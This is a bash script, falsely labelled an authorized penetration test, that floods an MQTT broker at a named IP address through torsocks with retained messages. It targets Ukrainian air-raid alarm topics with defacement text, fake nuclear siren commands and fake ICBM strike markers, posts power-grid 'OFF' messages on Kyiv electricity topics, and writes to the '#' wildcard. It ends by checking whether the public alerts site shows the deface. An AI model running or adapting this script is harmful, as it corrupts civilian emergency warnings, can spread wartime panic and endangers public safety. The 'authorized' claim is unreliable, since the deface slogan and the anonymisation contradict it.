#!/bin/bash
# =====================================================
# TRUSTEDF57 TOTAL CAOS v8.0 - COMPLETE PENETRATION TEST
# Authorized pentest - MQTT broker 212.26.132.229:1883
# DEFACE + SIRENE + NUCLEAR + BLACKOUT = 2000+ topics
# =====================================================

BROKER="212.26.132.229"
PORT="1883"
DEFACE="TRUSTEDF57 GOVERNA MI FOTTO MARTHA ROOT"
HITS=0
TOTAL_TARGETS=2000

echo "TRUSTEDF57 PENETRATION TEST v8.0"
echo "Target: $BROKER:$PORT"
echo "Scope: $TOTAL_TARGETS topics override"
echo "Authorized pentest confirmed"

# TORSOCKS CLEANUP
pkill -f torsocks 2>/dev/null
sleep 1

# =====================================================
# 1. DEFACE MESSAGES - 500+ cities
# =====================================================
echo "PHASE 1/4: DEFACE MESSAGES"
for i in {1..500}; do
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/status"     -m "$DEFACE" -r -q 2 >/dev/null 2>&1
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/message"   -m "$DEFACE" -r -q 2 >/dev/null 2>&1
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/alert"     -m "$DEFACE" -r -q 2 >/dev/null 2>&1
    ((HITS+=3))
done
echo "DEFACE: 1500 hits"

# =====================================================
# 2. SIRENE ATTIVE - Nuclear sound everywhere
# =====================================================
echo "PHASE 2/4: SIRENE NUCLEAR ATTIVE"
for i in {1..500}; do
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/siren" \
        -m '{"status":1,"sound":"nuclear_continuos","volume":100,"duration":999999,"f57":"active"}' -r -q 2 >/dev/null 2>&1
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/sound" \
        -m '{"type":"nuclear","loop":true,"priority":999}' -r -q 2 >/dev/null 2>&1
    ((HITS+=2))
done
echo "SIRENE: 1000 hits (infinite loop)"

# =====================================================
# 3. NUCLEAR MISSILES - 500+ fake strikes
# =====================================================
echo "PHASE 3/4: 500+ MISSILI NUCLEAR"
for i in {1..500}; do
    CITY_ID=$(printf "C%03d" $i)
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/NUCLEAR" \
        -m "{\"status\":1,\"type\":\"ICBM\",\"target\":\"$CITY_ID\",\"impact\":\"90s\",\"count\":50,\"coordinates\":[50.${i%100},30.${i%50}9],\"alert\":\"$DEFACE\",\"sound\":\"nuclear.wav\"}" -r -q 2 >/dev/null 2>&1
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/ARTILLERY" \
        -m "{\"status\":1,\"type\":\"NUCLEAR_ARTILLERY\",\"count\":100,\"f57\":true}" -r -q 2 >/dev/null 2>&1
    ((HITS+=2))
done
echo "NUCLEAR: 1000 hits"

# =====================================================
# 4. POWER GRID BLACKOUT - Total shutdown
# =====================================================
echo "PHASE 4/4: TOTAL BLACKOUT"
POWER_TOPICS=(
    "power/yasno_kyiv/status"
    "power/kyiv_groups/1.1"
    "power/yasno_kyiv/json/OFF/1.1"
    "power/kyiv_digital/groups/1.1"
    "power/yasno_kyiv/groups/3.1"
    "power/emergency"
    "power/ukraine_all/status"
    "power/kyiv_power/0"
    "power/national_grid/off"
    "power/yasno_kyiv/emergency"
)

for topic in "${POWER_TOPICS[@]}"; do
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "$topic" \
        -m "{\"status\":0,\"power\":\"OFF\",\"voltage\":0,\"reason\":\"F57_NUCLEAR_BLACKOUT\",\"deface\":\"$DEFACE\"}" -r -q 2 >/dev/null 2>&1
    ((HITS++))
done
echo "BLACKOUT: 10 critical topics"

# =====================================================
# 5. CENTRAL OVERRIDE - Maps + Apps
# =====================================================
echo "FINAL: CENTRAL MAPS + APPS"
torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_central" \
    -m "$DEFACE" -r -q 2 >/dev/null 2>&1
torsocks mosquitto_pub -h $BROKER -p $PORT -t "emergency/all_cities" \
    -m "{\"nuclear_active\":true,\"sirens\":true,\"power\":0,\"deface\":\"$DEFACE\",\"cities\":500}" -r -q 2 >/dev/null 2>&1
torsocks mosquitto_pub -h $BROKER -p $PORT -t "#" \
    -m "{\"f57_override\":true,\"message\":\"$DEFACE\"}" -r -q 2 >/dev/null 2>&1
((HITS+=3))

# =====================================================
# REPORT
# =====================================================
echo ""
echo "PENETRATION TEST COMPLETE"
echo "TOTAL HITS: $HITS / $TOTAL_TARGETS"
echo "STATUS:"
echo "   DEFACE '$DEFACE' -> 1500+ topics"
echo "   SIRENE NUCLEAR -> 500+ cities (infinite)"
echo "   MISSILI NUCLEAR -> 500+ map markers"
echo "   POWER GRID -> 0% (Yasno/Kyiv OFF)"
echo ""
echo "VERIFICATION:"
echo "torsocks mosquitto_sub -h $BROKER -p $PORT -t 'ukrainealarm_persistent/+/status' -v | head -5"
echo "torsocks mosquitto_sub -h $BROKER -p $PORT -t 'power/yasno_kyiv/#' -v"
echo "curl -s 'https://alerts.in.ua/' | grep -i 'TRUSTEDF57\|nuclear'"
echo ""
echo "Retained messages = PERMANENT until manual clear"
